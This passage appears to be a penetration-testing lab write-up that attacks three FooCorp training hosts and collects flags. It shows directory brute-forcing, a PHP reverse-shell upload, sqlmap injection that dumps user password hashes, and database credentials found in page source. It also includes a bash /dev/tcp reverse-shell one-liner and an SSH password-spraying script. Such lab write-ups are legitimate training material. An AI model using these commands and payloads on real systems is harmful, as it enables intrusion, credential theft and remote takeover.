**This machine's domain name is** [**http://75ajvxi36vchsv584es1.foocorp.io/**](http://75ajvxi36vchsv584es1.foocorp.io) ****&#x20;

This route should be added in the local `/etc/host`.
{% endhint %}

{% tabs %}
{% tab title="OWASP Dirbuster 1.0-RC1 against IP" %}
* Target URL: [http://172.16.64.](http://172.16.64.81)91
* File Extension: \*
* File with list of dirs/files: /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt
{% endtab %}

{% tab title="Report" %}
```bash
DirBuster 1.0-RC1 - Report
http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project
Report produced on Thu Jul 22 17:24:30 EDT 2021
--------------------------------

http://172.16.64.91:80
--------------------------------
Directories found during testing:

Dirs found with a 200 response:

/

Dirs found with a 403 response:

/icons/
/icons/small/
/server-status/


--------------------------------
--------------------------------

```
{% endtab %}

{% tab title="dirb against Domain name" %}
```
dirb http://75ajvxi36vchsv584es1.foocorp.io/
```
{% endtab %}

{% tab title="Output dirb" %}
```
-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Mon Aug  2 09:46:23 2021
URL_BASE: http://75ajvxi36vchsv584es1.foocorp.io/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://75ajvxi36vchsv584es1.foocorp.io/ ----
==> DIRECTORY: http://75ajvxi36vchsv584es1.foocorp.io/app/  
```
{% endtab %}
{% endtabs %}

{% hint style="info" %}
**A route to an app was discovered**

* [http://75ajvxi36vchsv584es1.foocorp.io/app/ ](http://75ajvxi36vchsv584es1.foocorp.io/app/)
* A file can be uploaded although form is broken

Actions:

* Fix upload form
* Upload reverse shell
{% endhint %}

{% tabs %}
{% tab title="Download Form" %}
```bash
# Save a local file with this updated code for the form
# Notice the form action argument
<html><body style="background: black; color: white;">
<script src="http://75ajvxi36vchsv584es1.foocorp.io/app/js/auth.js"></script>
<center><div style="border: 1px yellow double">
<br /><br />
<form action="http://75ajvxi36vchsv584es1.foocorp.io/app/upload.php" method="post" enctype="multipart/form-data">
<br />Select  file to upload:
<input type="file" name="fileToUpload" id="fileToUpload">
<input type="submit" value="Upload" name="submit">
</form>
<br /><br />
</div></center>
<hr /><br />
<center>&copy; FooCORP 2021</center>
<body></html>
```
{% endtab %}

{% tab title="Generate PHP RevShell" %}
```bash
wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
sed -i 's/127.0.0.1/172.16.64.10/' php-payload.php
```
{% endtab %}

{% tab title="Trigger from browser" %}
```
Simply open:
http://75ajvxi36vchsv584es1.foocorp.io/app/upload/php-reverse-shell.php
```
{% endtab %}
{% endtabs %}

{% hint style="success" %}
**Flag encountered through PHP reverse shell**

```
$ cat flag.txt
Congratulations, you got this!
$ pwd
/var/www/html
```
{% endhint %}

### ✔️172.16.64.92 (Linux 3.12 - 95%)

| Port      | State | Service | Version                         |
| --------- | ----- | ------- | ------------------------------- |
| 22/tcp    | open  | ssh     | OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 |
| 53/tcp    | open  | domain  | dnsmasq 2.75                    |
| 80/tcp    | open  | http    | Apache httpd 2.4.18             |
| 63306/tcp | open  | mysql   | MySQL 5.7.25-0ubuntu0.16.04.2   |

{% tabs %}
{% tab title="OWASP Dirbuster 1.0-RC1" %}
* Target URL: [http://172.16.64.](http://172.16.64.81)92
* File Extension: \*
* File with list of dirs/files: /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt
{% endtab %}

{% tab title="Report" %}
```bash
DirBuster 1.0-RC1 - Report
http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project
Report produced on Thu Jul 22 17:24:49 EDT 2021
--------------------------------

http://172.16.64.92:80
--------------------------------
Directories found during testing:

Dirs found with a 200 response:

/
/images/
/assets/
/assets/js/
/assets/css/
/assets/fonts/
/assets/sass/
/assets/css/images/
/assets/sass/libs/

Dirs found with a 403 response:

/icons/
/icons/small/
/server-status/


--------------------------------
Files found during testing:

Files found with a 200 responce:

/assets/js/jquery.scrolly.min.js
/assets/js/browser.min.js
/assets/js/breakpoints.min.js
/assets/js/jquery.min.js
/assets/js/util.js
/assets/js/main.js
/assets/js/footracking.js
/assets/css/font-awesome.min.css
/assets/sass/main.scss
/assets/sass/noscript.scss
/assets/fonts/FontAwesome.otf
/assets/css/main.css
/assets/css/images/overlay3.svg
/assets/css/noscript.css
/assets/fonts/fontawesome-webfont.eot
/assets/css/images/overlay4.svg
/assets/sass/libs/_breakpoints.scss
/assets/sass/libs/_functions.scss
/assets/sass/libs/_html-grid.scss
/assets/fonts/fontawesome-webfont.ttf
/assets/fonts/fontawesome-webfont.svg
/assets/sass/libs/_mixins.scss
/assets/sass/libs/_vars.scss
/assets/fonts/fontawesome-webfont.woff2
/assets/fonts/fontawesome-webfont.woff
/assets/sass/libs/_vendor.scss


--------------------------------

```
{% endtab %}
{% endtabs %}

{% hint style="info" %}
**Found secret url while inspecting footracking.js**

* view-source:[http://172.16.64.92/assets/js/footracking.js](http://172.16.64.92/assets/js/footracking.js)

```javascript
alert("Loaded!");
<!-- pre-login collect data -->
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
	if (this.readyState == 4 && this.status == 200) {
		console.log("OK");
	} else {
		console.log("Error!");
	}

	xhr.open("GET", "http://127.0.0.1/72ab311dcbfaa40ca0739f5daf505494/tracking2.php", true);
	xhr.send("ua=" + navigator.userAgent + "&platform=" + navigator.platform);
}
```
{% endhint %}

{% hint style="info" %}
**Having found  72ab311dcbfaa40ca0739f5daf505494/tracking2.ph**p URL leads to think there's another hidden tracking.php (without '2'), where an `id` url parameter can be passed:

![](<../../.gitbook/assets/image (31).png>)&#x20;

**Actions:**

* Try sqlmap
* Scan new found directory with Gobuster/Dirbuster
{% endhint %}

{% tabs %}
{% tab title="sqlmap (discover databases)" %}
```bash
sqlmap -u 'http://172.16.64.92/72ab311dcbfaa40ca0739f5daf505494/tracking.php?id=6' --dbs
```
{% endtab %}

{% tab title="Output sqlmap dbs" %}
```bash
[06:13:35] [INFO] fetching database names
available databases [2]:
[*] footracking
[*] information_schema
```
{% endtab %}

{% tab title="sqlmap (footracking tables)" %}
```
sqlmap -u 'http://172.16.64.92/72ab311dcbfaa40ca0739f5daf505494/tracking.php?id=6' -D footracking --tables
```
{% endtab %}

{% tab title="Output footracking tables" %}
```
Database: footracking
[2 tables]
+----------------+
| telemetry_test |
| users          |
+----------------+
```
{% endtab %}

{% tab title="sqlmap footracking.users dump" %}
```
sqlmap -u 'http://172.16.64.92/72ab311dcbfaa40ca0739f5daf505494/tracking.php?id=6' -D footracking -T users --dump
```
{% endtab %}

{% tab title="Output" %}
```
Database: footracking                                                                                                                                                                                   
Table: users
[4 entries]
+----+-----+-------------------------------------------+-----------+
| id | adm | password                                  | username  |
+----+-----+-------------------------------------------+-----------+
| 1  | yes | c5d71f305bb017a66c5fa7fd66535b84          | fcadmin1  |
| 2  | yes | 14d69ee186f8d9bbeddd4da31559ce0f          | fcadmin2  |
| 3  | no  | 827ccb0eea8a706c4c34a16891f84e7b (12345)  | tracking1 |
| 4  | no  | e10adc3949ba59abbe56e057f20f883e (123456) | tracking2 |
+----+-----+-------------------------------------------+-----------+

```
{% endtab %}
{% endtabs %}

{% hint style="warning" %}
**Found Credentials on MySQL database via sqlmap**

```
| id | adm | password                                  | username  |
+----+-----+-------------------------------------------+-----------+
| 1  | yes | c5d71f305bb017a66c5fa7fd66535b84          | fcadmin1  |
| 2  | yes | 14d69ee186f8d9bbeddd4da31559ce0f          | fcadmin2  |
| 3  | no  | 827ccb0eea8a706c4c34a16891f84e7b (12345)  | tracking1 |
| 4  | no  | e10adc3949ba59abbe56e057f20f883e (123456) | tracking2 |
+----+-----+-------------------------------------------+-----------+
```
{% endhint %}

{% tabs %}
{% tab title="Dirbuster new Route ?????????????" %}
* [http://172.16.64.92/72ab311dcbfaa40ca0739f5daf50549/](http://172.16.64.92/72ab311dcbfaa40ca0739f5daf50549/)
{% endtab %}

{% tab title="" %}
Output should be:

* [http://172.16.64.92/72ab311dcbfaa40ca0739f5daf50549/login.php](http://172.16.64.92/72ab311dcbfaa40ca0739f5daf50549/login.php)
{% endtab %}
{% endtabs %}

{% hint style="info" %}
**Discovered login route!**

* [http://172.16.64.92/72ab311dcbfaa40ca0739f5daf50549/](http://172.16.64.92/72ab311dcbfaa40ca0739f5daf50549/)login.php
{% endhint %}

{% hint style="info" %}
**Not enough privileges when login into** [**72ab311dcbfaa40ca0739f5daf50549/**](http://172.16.64.92/72ab311dcbfaa40ca0739f5daf50549/)**login.php with** `tracking1/12345`

****![](<../../.gitbook/assets/image (32).png>) ****&#x20;
{% endhint %}

{% hint style="warning" %}
**Found credentials in webpage's source code**

view-source:[http://172.16.64.92/72ab311dcbfaa40ca0739f5daf505494/panel.php](http://172.16.64.92/72ab311dcbfaa40ca0739f5daf505494/panel.php)

```
<!-- = '127.0.0.1'; = 'dbuser'; = 'xXxyYyzZz789789)))'; = 'footracking'; = mysqli_connect(, , , );--><br />
```

```
dbuser
xXxyYyzZz789789)))
footracking
```

Actions:

* Connect to new mysql database
* Elevate privileges for `tracking1` user
{% endhint %}

{% tabs %}
{% tab title="mysql connect" %}
```bash
mysql --host=172.16.64.92 --user=dbuser --password='xXxyYyzZz789789)))' --port=63306
```
{% endtab %}

{% tab title="Update user" %}
```
> use footracking
> update users set adm='yes' where id=3;
> select * from users;
+----+-----------+----------------------------------+-----+
| id | username  | password                         | adm |
+----+-----------+----------------------------------+-----+
|  1 | fcadmin1  | c5d71f305bb017a66c5fa7fd66535b84 | yes |
|  2 | fcadmin2  | 14d69ee186f8d9bbeddd4da31559ce0f | yes |
|  3 | tracking1 | 827ccb0eea8a706c4c34a16891f84e7b | yes |
|  4 | tracking2 | e10adc3949ba59abbe56e057f20f883e | no  |
+----+-----------+----------------------------------+-----+
4 rows in set (0.142 sec)
```
{% endtab %}
{% endtabs %}

{% hint style="warning" %}
We now get into a Admin Console panel where we can inject PHP sentences

* We initiate `nc -lvpn 1234` locally
* We open a reverse shell against our machine while we listen locally on port 1234

```
exec("/bin/bash -c 'bash -i >& /dev/tcp/172.16.64.10/1234 0>&1'");
```
{% endhint %}

{% hint style="info" %}
**We find a long DNS name on `/etc/hosts` while inspecting through our reverse shell**

* This is the last machine's IP to pwn.&#x20;

```
www-data@dns: $ cat /etc/hosts

...
127.0.0.1    0pm6duqbu2o8ajzkjeai.foocorp.io
127.0.0.1    ttpxbpp88fgt9r3292ag.foocorp.io
172.16.64.91    75ajvxi36vchsv584es1.foocorp.io
127.0.0.1    9fys6zpn5k03zt299wyj.foocorp.io
127.0.0.1    uvq8daoyiuq75znffwvy.foocorp.io
127.0.0.1    qv0jwarev2y4lq69xy9w.foocorp.io
127.0.0.1    h1z07t1pujg9ti677md0.foocorp.io
...
```
{% endhint %}

{% hint style="success" %}
**Flag encountered**

We find the flag while inspecting the remote filesystem through our reverse shell:

```
www-data@dns:/var/www$ cat flag.txt
cat flag.txt
Congratulations! You got it.
```
{% endhint %}

### ✔️172.16.64.166 (Linux 3.12 - 95%)

| Port     | State | Service | Version                         |
| -------- | ----- | ------- | ------------------------------- |
| 2222/tcp | open  | ssh     | OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 |
| 8080/tcp | open  | http    | Apache httpd 2.4.18             |

{% hint style="info" %}
**\[SSH] Warning about password policy**

Employees are requested to change their default `CHANGEME` password.

```
ssh admin@172.16.64.166 -p 2222                                                                                                             130 ⨯
#################################################################
#       WARNING! This system is for authorized users only.      #
#       You activity is being actively monitored.               #
#       Any suspicious behavior will be resported.              #
#################################################################

~~~~ WORK IN PROGRESS ~~~~
Dear employee! Remember to change the default CHANGEME password ASAP.

admin@172.16.64.166's password: 
```
{% endhint %}

{% tabs %}
{% tab title="OWASP Dirbuster 1.0-RC1" %}
* Target URL: [http://172.16.64.](http://172.16.64.81)166:8080
* File Extension: \*
* File with list of dirs/files: /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt
{% endtab %}

{% tab title="Report" %}
```bash
DirBuster 1.0-RC1 - Report
http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project
Report produced on Thu Jul 22 17:25:53 EDT 2021
--------------------------------

http://172.16.64.166:8080
--------------------------------
Directories found during testing:

Dirs found with a 200 response:

/
/img/
/img/blog/
/img/gallery/
/css/
/js/
/img/stream/
/img/slider/

Dirs found with a 403 response:

/icons/
/icons/small/
/server-status/


--------------------------------
--------------------------------
```
{% endtab %}
{% endtabs %}

{% hint style="info" %}
**\[Web] Found commented** info **for logged in users on the website's markup**!

* [http://172.16.64.166:8080/about-us.htm](http://172.16.64.166:8080/about-us.htm)

&#x20;![](<../../.gitbook/assets/image (24).png>)&#x20;
{% endhint %}

{% tabs %}
{% tab title="Grab website" %}
```
wget http://172.16.64.166:8080/about-us.htm
xmllint --html about-us.htm --xpath '//comment()'
```
{% endtab %}

{% tab title="Commented markup" %}
```bash
about-us.htm:47: HTML parser error : Tag header invalid
  <header id="header">
                     ^
about-us.htm:60: HTML parser error : Tag nav invalid
             <nav id="nav" role="navigation">
                                            ^
about-us.htm:86: HTML parser error : Tag section invalid
<section id="titlebar">
                      ^
about-us.htm:95: HTML parser error : Tag nav invalid
			<nav id="breadcrumbs">
			                     ^
about-us.htm:304: HTML parser error : Tag footer invalid
  <footer id="footer">
                     ^
<!--[if lt IE 7 ]><html class="ie ie6" lang="en"> <![endif]-->
<!--[if IE 7 ]><html class="ie ie7" lang="en"> <![endif]-->
<!--[if IE 8 ]><html class="ie ie8" lang="en"> <![endif]-->
<!--[if (gte IE 9)|!(IE)]><!-->
<!--<![endif]-->
<!--
	ucorpora by freshdesignweb.com
	Twitter: https://twitter.com/freshdesignweb
	https://www.freshdesignweb.com/ucorpora/
-->
<!-- Basic Meta Tags -->
<!--[if (gte IE 9)|!(IE)]>
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
  <![endif]-->
<!-- Favicon -->
<!-- Styles -->
<!-- Font Avesome Styles -->
<!--[if IE 7]>
		<link href="css/font-awesome/font-awesome-ie7.min.css" rel="stylesheet">
	<![endif]-->
<!-- FlexSlider Style -->
<!-- Internet Explorer condition - HTML5 shim, for IE6-8 support of HTML5 elements -->
<!--[if lt IE 9]>
		<script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>
	<![endif]-->
<!-- Header -->
<!-- Logo -->
<!-- Submenu -->
<!-- End Submenu -->
<!-- Header End -->
<!-- Titlebar
================================================== -->
<!-- Container -->
<!-- Container / End -->
<!-- Content -->
<!-- Our Team -->
<!-- For logged in only    
          <div  class="slider2 team flexslider">
            <ul class="slides">
              <li>
                <div class="row">
                                  
                  <a href="#">
                    <div class="span3 square-1">
                      <div class="img-container">
                        <img src="img/our-team/1.jpg" alt="">
                        <div class="img-bg-icon"></div>
                      </div>
                      <h4>Elizabeth Lopez</h4>
                        managing director  
                    </div>
                  </a>
                  
                  <a href="#">
                    <div class="span3 square-1">
                      <div class="img-container">
                        <img src="img/our-team/2.jpg" alt="">
                        <div class="img-bg-icon"></div>
                      </div>
                      <h4>Tara Baker</h4>
                        designer
                    </div>
                  </a>
                  
                  <a href="#">
                    <div class="span3 square-1">
                      <div class="img-container">
                        <img src="img/our-team/3.jpg" alt="">
                        <div class="img-bg-icon"></div>
                      </div>
                      <h4>Becky Casey</h4>
                        project manager 
                    </div>
                  </a>
                  
                  <a href="#">
                    <div class="span3 square-1">
                      <div class="img-container">
                        <img src="img/our-team/4.jpg" alt="">
                        <div class="img-bg-icon"></div>
                      </div>
                      <h4>Randy Carlson</h4>
                        developer
                    </div>
                  </a>
                  
                </div> 
              </li>
              <li>
                <div class="row">
                
                  <a href="#">
                    <div class="span3 square-1">
                      <div class="img-container">
                        <img src="img/our-team/3.jpg" alt="">
                        <div class="img-bg-icon"></div>
                      </div>
                      <h4>Pablo Roberts</h4>
                        founder
                    </div>
                  </a>
                  
                  <a href="#">
                    <div class="span3 square-1">
                      <div class="img-container">
                        <img src="img/our-team/4.jpg" alt="">
                        <div class="img-bg-icon"></div>
                      </div>
                      <h4>Bessie Hammond</h4>
                        programmer 
                    </div>
                  </a>
                  
                  <a href="#">
                    <div class="span3 square-1">
                      <div class="img-container">
                        <img src="img/our-team/1.jpg" alt="">
                        <div class="img-bg-icon"></div>
                      </div>
                      <h4>Gerardo Malone</h4>
                        junior designer
                    </div>
                  </a>
                  
                  <a href="#">
                    <div class="span3 square-1">
                      <div class="img-container">
                        <img src="img/our-team/2.jpg" alt="">
                        <div class="img-bg-icon"></div>
                      </div>
                      <h4>Sabrina Summers</h4>
                        analyst
                    </div>
                  </a>
                  
                </div> 
              </li>
            </ul>
          </div>
           //Our Team End -->
<!-- Typography Row -->
<!-- Line -->
<!-- Button -->
<!-- Title -->
<!-- Line -->
<!-- Typography Row End-->
<!-- List -->
<!-- List End -->
<!-- Progress Bar -->
<!-- Progress Bar End -->
<!-- Client Says -->
<!-- Client Says End -->
<!-- Content End -->
<!-- Footer -->
<!-- Footer End -->
<!-- JavaScripts -->

```
{% endtab %}

{% tab title="users.txt" %}
```
# We generate this dictionary from the names found in the commented markup
elizabeth 
Lopez
elizabethlopez
elopez
managingdirector
director
manager  
tara
baker
tarabaker
tbaker
designer
beckycasey
becky
casey
bcasey
project
manager 
projectmanager
randy
carlson
randycarlson
rcarlson
developer
pabloroberts
pablo
roberts
proberts
founder
bessiehammond
bessie
hammond
bhammond
programmer 
gerardomalone
gerardo
malone
gmalone
juniordesigner
junior
designer
sabrina 
```
{% endtab %}

{% tab title="script.sh" %}
```bash
#!/bin/sh
# Bruteforce known users against SSH with password CHANGEME

for user in $(cat users.txt); 
do
    echo "Trying '$user'..."
    sshpass -p CHANGEME ssh -p 2222 $user@172.16.64.166 2>/dev/null
    if [ $? -eq 0 ]; then
        exit
    fi
done;
```
{% endtab %}

{% tab title="Output" %}
```
$ sh script.sh                              
Trying 'elizabeth'...
Trying 'Lopez'...
Trying 'elizabethlopez'...
Trying 'elopez'...
Trying 'managingdirector'...
Trying 'director'...
Trying 'manager'...
Trying 'tara'...
Trying 'baker'...
Trying 'tarabaker'...
Trying 'tbaker'...
Trying 'designer'...
Trying 'beckycasey'...
Trying 'becky'...
Trying 'casey'...
Trying 'bcasey'...
Trying 'project'...
Trying 'manager'...
Trying 'projectmanager'...
Trying 'randy'...
Trying 'carlson'...
Trying 'randycarlson'...
Trying 'rcarlson'...
Trying 'developer'...
Trying 'pabloroberts'...
Trying 'pablo'...
Trying 'roberts'...
Trying 'proberts'...
Trying 'founder'...
Trying 'bessiehammond'...
Trying 'bessie'...
Trying 'hammond'...
Trying 'bhammond'...
Trying 'programmer'...
Trying 'gerardomalone'...
Trying 'gerardo'...
Trying 'malone'...
Trying 'gmalone'...
Trying 'juniordesigner'...
Trying 'junior'...
Trying 'designer'...
Trying 'sabrina'...
Welcome to Ubuntu 16.04.3 LTS (GNU/Linux 4.4.0-104-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

195 packages can be updated.
10 updates are security updates.

Last login: Thu Jul 22 22:17:15 2021 from 172.16.64.10
sabrina@xubuntu:~$ 
```
{% endtab %}
{% endtabs %}

{% hint style="warning" %}
**\[SSH] We are able to login with** sabrina:CHANGEME

```
Trying 'sabrina'...
Welcome to Ubuntu 16.04.3 LTS (GNU/Linux 4.4.0-104-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

195 packages can be updated.
10 updates are security updates.

Last login: Thu Jul 22 22:17:15 2021 from 172.16.64.10
sabrina@xubuntu:~$ 
```
{% endhint %}

{% hint style="info" %}
**Found hosts.bak in sabrina's account via ssh:**

```
sabrina@xubuntu:~$ cat ~/hosts.bak 
127.0.0.1	localhost
172.16.64.81	cms.foocorp.io
172.16.64.81    static.foocorp.io

# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```
{% endhint %}

{% hint style="success" %}
**Flag encountered!** :grin:&#x20;

```
sabrina@xubuntu:~$ cat ~/flag.txt 
Congratulations! You have successfully exploited this machine.
Go for the others now.
```
{% endhint %}
